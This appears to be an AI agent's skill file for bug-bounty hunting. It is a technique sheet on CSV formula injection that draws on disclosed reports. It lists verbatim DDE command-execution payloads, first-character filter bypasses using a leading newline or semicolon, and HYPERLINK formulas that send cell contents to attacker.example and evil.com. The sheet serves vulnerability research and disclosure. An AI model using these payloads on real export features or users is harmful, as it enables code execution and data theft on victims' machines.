---
name: hunter-l3-csv-injection
description: "Use when hunting CSV Injection on a target. Loads the L3 technique sheet: CSV (formula/spreadsheet) injection occurs when user-controlled strings are written into exported CSV/Excel files without neutralizing leading formula metacharacters (`=`, `+`, `-`, `@`, and cell separators like `;`)."
domain: cybersecurity
subdomain: web
tags:
- web
- csv-injection
- hunting
- l3
version: '1.0'
---

# CSV Injection — Technique Sheet

## Overview

CSV (formula/spreadsheet) injection occurs when user-controlled strings are written into exported CSV/Excel files without neutralizing leading formula metacharacters (`=`, `+`, `-`, `@`, and cell separators like `;`). When a victim — usually an admin or staff member — opens the export in Excel, LibreOffice, or Google Sheets, the crafted cell is evaluated as a formula, enabling calculation proof, outbound data exfiltration (HYPERLINK), and OS command execution on Windows via DDE (`cmd|' /C ...'`). It pays wherever stored user input flows into any "export to CSV/Excel" feature: user lists, reports, payment histories, vault exports, attendee lists, issue exports. The attacker's payload is planted once; the victim triggers it on their own machine.

## Distinct sub-patterns

### 1. Vanilla formula injection via stored user field (most common — 10+ records)

- Endpoint shape: any export endpoint whose rows include user-writable strings. Concrete templates from records:
  - `GET /{user}/{project}/issues/export` — issue title (GitLab, id=216243)
  - `GET /services/partners/api_clients/{num}/export_installed_users` — store name (Shopify, id=100667)
  - Payment history export — participant name (Gratipay, id=219323)
  - Customer name → CSV export (Grab, id=244292)
  - POST /notes → CSV export (Semrush, id=459532)
  - `GET /dictionaries/{project}/{lang}/` CSV export — source/translation (Weblate, id=223344)
  - Client name → POST /clients export CSV (Consensys, id=1748961)
- Payload verbatim:
  - `=cmd|' /C calc'!A0` (GitLab, Gratipay, Grab, Uber)
  - `=cmd|' /C notepad'!'A1'` (Consensys)
  - `=1+1` (Weblate, HackerOne id=72785)
  - `=2*10` (Automattic id=92353)
  - `=4+4` (Chaturbate id=386116)
  - `=AND(2>1)` and `=7*7` (Ian Dunn/Camptix id=151516)
- Root cause: exported cells beginning with `=`, `+`, `-`, `@` are not prefixed/escaped, so spreadsheet apps evaluate them as formulas.
- Impact proven: calc.exe launched on Windows (GitLab, Gratipay, Grab, Shopify, Consensys, Camptix); arithmetic formulas evaluated (`=1+1` → 2, `=2*10` → 20, `=4+4` → 8); data exfiltration via HYPERLINK and cmd execution on another admin's machine (Uber).
- Exemplars: id=216243 (GitLab), id=72785 (HackerOne).

### 2. DDE command execution variant (`cmd|' /C calc'!A0`)

- Endpoint shape: same as above; the differentiator is the DDE-style formula that pops a process instead of pure arithmetic.
- Payload verbatim: `=cmd|' /C calc'!A0`; also `;=cmd|' /C calc'!A0` (HackerOne id=124223) and `;=cmd|' /C calc'!A5` (Ian Dunn id=164674) — the leading `;` starts a new cell so the formula begins after a separator.
- Root cause: DDE (Dynamic Data Exchange) formulas are still honored by Excel 2003–2016; sanitization that only considers plain `=SUM(...)` style formulas misses them.
- Impact proven: calc.exe launched on Excel 2003–2013 (id=124223) and Excel 2016 (id=164674) — code execution on the analyst's machine (CVE-2014-3524 vector, cited by Consensys id=1748961).
- Exemplars: id=124223 (HackerOne), id=164674 (Ian Dunn).

### 3. Exfiltration via HYPERLINK formula

- Endpoint shape: any export opened by *another* user with network access. Fields: vault item fields (1Password id=3042984), note field (Semrush id=459532), username (Uber id=126109).
- Payload verbatim:
  - `=HYPERLINK("http://attacker.example/steal?"&A1,"Click here")` (1Password)
  - `=HYPERLINK("http://evil.com", "EVIL")` (Semrush)
- Root cause: HYPERLINK is a benign-looking formula that makes the spreadsheet issue an outbound HTTP request concatenating cell contents — silently exfiltrating adjacent data when the cell/link is opened.
- Impact proven: 1Password scenario — attacker shares a vault, stores the payload, target exports vault to CSV and opens it; all exported vault contents can be exfiltrated to the attacker's server. Uber: exfiltration from another admin's machine confirmed as feasible.
- Exemplars: id=3042984 (1Password), id=459532 (Semrush).

### 4. Filter bypass via leading newline (0x0a)

- Endpoint shape: POST /security/reports/ — `report[title]`, later exported as CSV (HackerOne id=111192).
- Payload verbatim: `%0A-2+3+cmd|' /C calc'!D2` (URL-encoded newline before the formula).
- Root cause: an earlier fix (for id=72785) filtered only the *first* character of the field for `=`, `+`, `-`, `@`. A leading newline means the formula characters sit at position 2+, so the first-char filter sees a benign character while Excel still parses the cell as a formula.
- Impact proven: exported reports CSV cell was active/formula-executing after the fix was in place — a regression-proof bypass.
- Exemplar: id=111192 (HackerOne).

### 5. Filter bypass via leading `;` (cell-splitter)

- Endpoint shape: HackerOne `/credentials` export (id=1131887); Camptix CSV export (id=164674); HackerOne CSV export (id=124223).
- Payload verbatim:
  - `;=1+1;` (HackerOne /credentials — cell evaluated to 2)
  - `;=cmd|' /C calc'!A0` (id=124223)
  - `;=cmd|' /C calc'!A5` (id=164674)
- Root cause: two mechanisms collide. (a) The export escapes/only-inspects the first character of the field; (b) a leading `;` is treated as a delimiter by Excel's parser, so everything after it lands in the same cell as a fresh formula. The sanitizer guards the field start; Excel guards nothing after a delimiter.
- Impact proven: formulas evaluated and calc executed in Excel; on older Windows, possible command execution (id=1131887).
- Exemplars: id=1131887 (HackerOne /credentials), id=164674 (Camptix — export escaped only the first character of the cell, so `;` opened a new one).

### 6. Semicolon-padded formula (delimiter-agnostic parse)

- Endpoint shape: HackerOne `/credentials` export (id=1131887) — same as above but worth isolating: `;=1+1;` works both as a filter bypass and because Excel accepts semicolon-delimited parsing depending on locale/variant.
- Root cause: sanitization assumed comma-delimited, first-character-scoped cells; Excel's tolerant parsing accepted the padded formula.
- Impact: cell evaluated to 2 in Excel.
- Exemplar: id=1131887.

### 7. Bulk stored injection across registration/custom fields (poison-many-rows)

- Endpoint shape: Camptix ticket registration form — `firstname`, `lastname` attendee fields (Ian Dunn id=151516); Automattic email-group member export — `firstname`, `lastname`, custom data (id=92353).
- Payload verbatim: `=AND(2>1)`, `=7*7` (Camptix); `=2*10` (Automattic).
- Root cause: many user-writable fields per row × many rows = many active cells; the export escapes none of them. Any field type (including "custom data") is a candidate.
- Impact proven: formulas evaluated when the admin opened the attendee export in Excel, enabling command execution on the admin's Windows machine (Camptix); `=2*10` → 20 plus malware/command-execution potential (Automattic).
- Exemplars: id=151516 (Ian Dunn), id=92353 (Automattic).

### 8. `-` and `+` prefixed arithmetic formulas (non-`=` prefixes)

- Endpoint shape: same export surfaces; the payload uses `+` or `-` as the formula initiator instead of `=`.
- Payload verbatim: `-2+3+cmd|' /C calc'!D2` (Shopify store-name field, id=100667); the newline bypass `%0A-2+3+cmd|' /C calc'!D2` (HackerOne id=111192) also lands as a `-`-prefixed formula.
- Root cause: Excel treats a leading `-` as an implicit formula start (negation/expression). Sanitizers often focus on `=` and miss `-`/`+`.
- Impact proven: calc launched when the Shopify installed-users CSV was opened in Excel.
- Exemplar: id=100667 (Shopify).

### 9. Unsanitized export field with no attacker-visible payload (benign-proof class)

- Endpoint shape: CSV export feature (Moneybird id=130338); Chaturbate token transaction export — `note` field (id=386116).
- Payload: Moneybird — payload not stated; Chaturbate: `=4+4` (evaluated to 8 on open).
- Root cause: export includes cell values beginning with formula characters without escaping; Moneybird's record notes input is now filtered in the export (fix confirmed).
- Impact proven: formulas executed on the client when opening in Excel (Moneybird); `=4+4` → 8 and OS-command-execution potential (Chaturbate, CVSS 3.1 cited).
- Exemplars: id=130338 (Moneybird), id=386116 (Chaturbate).

## Bypass / chain notes

- First-character filter bypass #1 — newline: `%0A` before the formula (id=111192). Fix filtered the leading char only; the newline pushes the formula one character in. Any whitespace/non-formula prefix that Excel still tolerates before parsing works the same way.
- First-character filter bypass #2 — semicolon cell-splitter: `;=cmd|' /C calc'!A0` (id=124223, id=164674) and `;=1+1;` (id=1131887). The `;` is parsed as a delimiter, so the formula starts a "new cell" after position 1, defeating per-field first-char escaping. This bypassed the fix for id=72785 twice.
- Prefix diversification: when `=` is filtered, `-2+3+cmd|...` (id=100667) shows `-` works as a formula initiator.
- Multi-step chain (1Password, id=3042984): (1) attacker shares a vault with the target, (2) stores the `=HYPERLINK("http://attacker.example/steal?"&A1,"Click here")` payload in an item field, (3) target exports vault to CSV, (4) target opens it — exported contents flow to the attacker's server. The sharing step makes the *victim* plant their own data next to your payload.
- Regression pattern: HackerOne had three separate CSV-injection reports (id=72785 → id=111192 → id=124223); each fix (filter first char → block `=+-@` first char) was bypassed by a payload that moved the formula past the filtered position (`%0A-2+3...`, then `;=cmd...`). Assume any position-based sanitizer is bypassable.
- Cross-user trigger: Uber (id=126109) and Semrush (id=459532) both hinge on a *different* user downloading the export — the payload author is never the one who opens the file. This is what elevates severity: code execution on another principal's machine.

## Gotchas / what NOT to do

- Don't test only with `=1+1` and call it done: several of these programs' fixes were bypassed precisely because the tester went beyond the obvious payload (`%0A` prefix, `;` prefix, `-` prefix). Use the bypass variants when a fix exists.
- Don't assume only `=` triggers: `-` and `+` prefixed payloads fired (Shopify id=100667). Cover `=`, `+`, `-`, `@`, and `;`-padded variants.
- Don't ignore non-obvious fields: store names (Shopify), report titles (HackerOne), issue titles (GitLab), attendee first/last names (Camptix), token transaction notes (Chaturbate), translation strings (Weblate), participant names (Gratipay), vault item fields (1Password). Every user-writable string that reaches a cell is a candidate.
- Don't fix (or report) by escaping only the first character: that is exactly the flawed mitigation these records repeatedly broke (id=111192, id=164674). Proper neutralization must consider delimiters and any position, not just index 0.
- Don't mark CSV injection with arithmetic payloads as full RCE on modern defaults: `=cmd|' /C calc'!A0` was proven on Excel 2003–2016 / older Windows; several records describe command execution as "possible" on older Windows only. State the Excel version you verified (records explicitly cite Excel 2003–2013, 2016, and Excel 2003–2013 for id=124223).
- Don't need a payload to earn a finding when the export is demonstrably unescaped: Moneybird (id=130338) was accepted with payload not stated — the root cause and executed-formula behavior sufficed.

## Real-world impact examples

- Shopify (id=100667): renaming a store to `-2+3+cmd|' /C calc'!D2` and exporting the installed-users CSV launched calc on the admin's machine via Excel.
- GitLab (id=216243): an issue titled `=cmd|' /C calc'!A0` executed calc.exe on Windows when the issues CSV export was opened.
- Uber (id=126109): a username starting with `=` was exported by business.uber.com and interpreted by Excel — confirmed data exfiltration via HYPERLINK and code execution on another admin's machine.
- 1Password (id=3042984): a shared-vault item containing `=HYPERLINK("http://attacker.example/steal?"&A1,"Click here")` could exfiltrate all exported vault contents when the target exported to CSV and opened it.
- HackerOne (id=111192): `%0A-2+3+cmd|' /C calc'!D2` in a report title bypassed the shipped first-character filter and left the exported CSV cell active — a demonstrated fix bypass.
- Ian Dunn / Camptix (id=151516, id=164674): attendee signup fields with `=AND(2>1)` / `=7*7` executed on the admin's Excel export enabling command execution on their Windows machine; a follow-up report showed the first-character-only escape was bypassable with `;=cmd|' /C calc'!A5` (calc fired in Excel 2016).
- Chaturbate (id=386116): token note `=4+4` evaluated to 8 on open, with OS-command-execution potential (CVSS 3.1 scored).
- Semrush (id=459532): note containing `=HYPERLINK("http://evil.com", "EVIL")` executes for any user who downloads the CSV, enabling OS-command execution.
- Consensys (id=1748961): a client named `=cmd|' /C notepad'!'A1'` produced a CSV that executed the command on open (explicitly framed as the CVE-2014-3524 vector).